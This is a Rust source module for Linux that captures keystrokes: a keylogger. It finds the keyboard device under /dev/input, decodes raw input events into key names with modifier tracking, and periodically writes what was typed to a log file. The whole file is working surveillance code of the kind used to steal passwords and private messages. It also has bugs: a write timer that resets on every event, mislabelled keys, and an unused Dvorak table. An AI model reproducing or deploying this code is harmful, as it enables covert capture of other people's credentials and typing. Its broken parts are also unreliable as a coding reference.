use anyhow::Result;
use byteorder::{NativeEndian, ReadBytesExt};
use std::{
    collections::HashMap,
    fs::{File, OpenOptions},
    io::{self, BufRead, Cursor, Read},
    path::Path,
    time::SystemTime,
};

fn get_key_hash_map() -> HashMap<u16, &'static str> {
    let _qwerty_map_no_mod: HashMap<u16, &str> = HashMap::from([
        (30 as u16, "a"),
        (1 as u16, "[esc]"),
        (31 as u16, "s"),
        (32 as u16, "d"),
        (33 as u16, "f"),
        (34 as u16, "g"),
        (35 as u16, "h"),
        (36 as u16, "j"),
        (37 as u16, "k"),
        (38 as u16, "l"),
        (39 as u16, ";"),
        (40 as u16, "'"),
        (28 as u16, "[retun]"),
        (14 as u16, "[backspace]"),
        (42 as u16, "[Lshift]"),
        (44 as u16, "z"),
        (45 as u16, "x"),
        (46 as u16, "c"),
        (47 as u16, "v"),
        (48 as u16, "b"),
        (49 as u16, "n"),
        (50 as u16, "m"),
        (51 as u16, ","),
        (52 as u16, "."),
        (53 as u16, "/"),
        (54 as u16, "[Rshift]"),
        (29 as u16, "[Lctrl]"),
        (56 as u16, "[Loption]"),
        (41 as u16, "`"),
        (2 as u16, "1"),
        (3 as u16, "2"),
        (4 as u16, "3"),
        (5 as u16, "4"),
        (6 as u16, "5"),
        (7 as u16, "6"),
        (8 as u16, "7"),
        (9 as u16, "8"),
        (10 as u16, "9"),
        (11 as u16, "0"),
        (12 as u16, "-"),
        (13 as u16, "="),
        (15 as u16, "[tab]"),
        (16 as u16, "q"),
        (17 as u16, "w"),
        (18 as u16, "e"),
        (19 as u16, "r"),
        (20 as u16, "t"),
        (21 as u16, "y"),
        (22 as u16, "u"),
        (23 as u16, "i"),
        (24 as u16, "o"),
        (25 as u16, "p"),
        (26 as u16, "["),
        (27 as u16, "]"),
        (43 as u16, "\\"),
        (58 as u16, "[capslock]"),
        (103 as u16, "[uparrow]"),
        (106 as u16, "[rightarrow]"),
        (105 as u16, "[leftarrow]"),
        (108 as u16, "[downarrow]"),
        (57 as u16, "[space]"),
        (125 as u16, "[Lfunction]"),
        (126 as u16, "[Rmeta]"),
        (59 as u16, "[F1]"),
        (60 as u16, "[F2]"),
        (61 as u16, "[F3]"),
        (62 as u16, "[F4]"),
        (63 as u16, "[F5]"),
        (64 as u16, "[F6]"),
        (65 as u16, "[F7]"),
        (66 as u16, "[F8]"),
        (67 as u16, "[F9]"),
        (68 as u16, "[F0]"),
    ]);
    let _dvorak_map_no_mod: HashMap<u16, &str> = HashMap::from([
        (30 as u16, "a"),
        (1 as u16, "[esc]"),
        (31 as u16, "o"),
        (32 as u16, "e"),
        (33 as u16, "u"),
        (34 as u16, "i"),
        (35 as u16, "d"),
        (36 as u16, "h"),
        (37 as u16, "t"),
        (38 as u16, "n"),
        (39 as u16, "s"),
        (40 as u16, "-"),
        (28 as u16, "[retun]"),
        (14 as u16, "[backspace]"),
        (42 as u16, "[Lshift]"),
        (44 as u16, ";"),
        (45 as u16, "q"),
        (46 as u16, "j"),
        (47 as u16, "k"),
        (48 as u16, "x"),
        (49 as u16, "b"),
        (50 as u16, "m"),
        (51 as u16, "w"),
        (52 as u16, "v"),
        (53 as u16, "z"),
        (54 as u16, "[Rshift]"),
        (29 as u16, "[Lctrl]"),
        (56 as u16, "[Loption]"),
        (41 as u16, "`"),
        (2 as u16, "1"),
        (3 as u16, "2"),
        (4 as u16, "3"),
        (5 as u16, "4"),
        (6 as u16, "5"),
        (7 as u16, "6"),
        (8 as u16, "7"),
        (9 as u16, "8"),
        (10 as u16, "9"),
        (11 as u16, "0"),
        (12 as u16, "["),
        (13 as u16, "]"),
        (15 as u16, "[tab]"),
        (16 as u16, "'"),
        (17 as u16, ","),
        (18 as u16, "."),
        (19 as u16, "p"),
        (20 as u16, "y"),
        (21 as u16, "f"),
        (22 as u16, "g"),
        (23 as u16, "c"),
        (24 as u16, "r"),
        (25 as u16, "l"),
        (26 as u16, "/"),
        (27 as u16, "="),
        (43 as u16, "\\"),
        (58 as u16, "[capslock]"),
        (103 as u16, "[uparrow]"),
        (106 as u16, "[rightarrow]"),
        (105 as u16, "[leftarrow]"),
        (108 as u16, "[downarrow]"),
        (57 as u16, "[space]"),
        (125 as u16, "[Lfunction]"),
        (126 as u16, "[Rmeta]"),
        (59 as u16, "[F1]"),
        (60 as u16, "[F2]"),
        (61 as u16, "[F3]"),
        (62 as u16, "[F4]"),
        (63 as u16, "[F5]"),
        (64 as u16, "[F6]"),
        (65 as u16, "[F7]"),
        (66 as u16, "[F8]"),
        (67 as u16, "[F9]"),
        (68 as u16, "[F0]"),
    ]);
    return _qwerty_map_no_mod;
}

pub(crate) fn nix_find_keyboard_device() -> Result<String> {
    let event_definition_file = "/proc/bus/input/devices";
    let event_dir = "/dev/input/";
    let mut keyboard_file = String::new();
    let mut tmp_value = String::new();
    //Open event definitions file
    let event_file_lines = File::open(event_definition_file)?;

    for line in io::BufReader::new(event_file_lines).lines() {
        let tmp_line = line.unwrap();
        // Set handler file
        if tmp_line.contains("H: Handlers=sysrq") {
            tmp_value = Path::new(&tmp_line)
                .file_name()
                .unwrap()
                .to_string_lossy()
                .to_string();
        }
        // If handler file supports keyboard events break.
        if tmp_line.contains("EV=120013") {
            let vec = tmp_value.split(" ");
            for elem in vec {
                if elem.contains("event") {
                    tmp_value = elem.to_string();
                    break;
                }
            }
            // Format keyboard file
            keyboard_file = format!("{}{}", event_dir, tmp_value);
            break;
        }
    }

    Ok(keyboard_file)
}

pub(crate) fn nix_log_keys(
    keyboard_device_path: String,
    log_file: String,
    write_interval: u64,
) -> Result<()> {
    let mut shift: bool = false;
    let mut capslock: bool = false;
    let mut ctrl: bool = false;
    let mut option: bool = false;
    let mut func: bool = false;

    let mut file_options = OpenOptions::new();
    file_options.read(true);
    file_options.write(false);
    let mut dev_file = file_options.open(keyboard_device_path).unwrap();
    let mut packet = [0u8; 24];
    let mut capture_buffer: String = "".to_string();
    let mut now;
    let qwerty_map_no_mod = get_key_hash_map();

    loop {
        now = SystemTime::now();
        dev_file.read_exact(&mut packet).unwrap();
        let mut rdr = Cursor::new(packet);
        let tv_sec = rdr.read_u64::<NativeEndian>().unwrap();
        let tv_usec = rdr.read_u64::<NativeEndian>().unwrap();
        let evtype = rdr.read_u16::<NativeEndian>().unwrap();
        let code = rdr.read_u16::<NativeEndian>().unwrap();
        let value = rdr.read_i32::<NativeEndian>().unwrap();
        match now.elapsed() {
            Ok(elapsed) => {
                if elapsed.as_secs() >= write_interval {
                    if capture_buffer.len() > 0 {
                        super::log_keys_to_disk(capture_buffer.clone(), log_file.clone())?;
                    }
                    capture_buffer = "".to_string();
                }
            }
            Err(e) => {
                println!("Error: {:?}", e);
            }
        }
        if code != 0 && (evtype == 1 && (value == 1 || value == 0)) {
            if qwerty_map_no_mod.contains_key(&code) {
                if value == 1 {
                    if qwerty_map_no_mod[&code] == "[Lshift]"
                        || qwerty_map_no_mod[&code] == "[Rshift]"
                    {
                        shift = true
                    };
                    if qwerty_map_no_mod[&code] == "[capslock]" {
                        capslock = !capslock
                    };
                    if qwerty_map_no_mod[&code] == "[Lctrl]"
                        || qwerty_map_no_mod[&code] == "[Rctrl]"
                    {
                        ctrl = true
                    };
                    if qwerty_map_no_mod[&code] == "[Lshift]"
                        || qwerty_map_no_mod[&code] == "[Rshift]"
                    {
                        shift = true
                    };
                    if qwerty_map_no_mod[&code] == "[Loption]"
                        || qwerty_map_no_mod[&code] == "[Roption]"
                    {
                        option = true
                    };
                    if qwerty_map_no_mod[&code] == "[Lfunction]"
                        || qwerty_map_no_mod[&code] == "[Rfunction]"
                    {
                        func = true
                    };

                    capture_buffer.push_str(
                        super::set_modifier(
                            qwerty_map_no_mod[&code],
                            shift,
                            capslock,
                            ctrl,
                            option,
                            func,
                        )
                        .unwrap()
                        .as_str(),
                    );
                } else if value == 0 {
                    if qwerty_map_no_mod[&code] == "[Lshift]"
                        || qwerty_map_no_mod[&code] == "[Rshift]"
                    {
                        shift = false
                    };
                    if qwerty_map_no_mod[&code] == "[Lctrl]"
                        || qwerty_map_no_mod[&code] == "[Rctrl]"
                    {
                        ctrl = false
                    };
                    if qwerty_map_no_mod[&code] == "[Lshift]"
                        || qwerty_map_no_mod[&code] == "[Rshift]"
                    {
                        shift = false
                    };
                    if qwerty_map_no_mod[&code] == "[Lshift]"
                        || qwerty_map_no_mod[&code] == "[Rshift]"
                    {
                        shift = false
                    };
                }
            } else if value == 1 || value == 0 {
                println!("{} {} {} {} {}", tv_sec, tv_usec, evtype, code, value);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_nix_find_keyboard_device() -> Result<()> {
        let keyboard_device = nix_find_keyboard_device()?;
        assert!(keyboard_device.contains("/dev/input/event"));
        Ok(())
    }
}
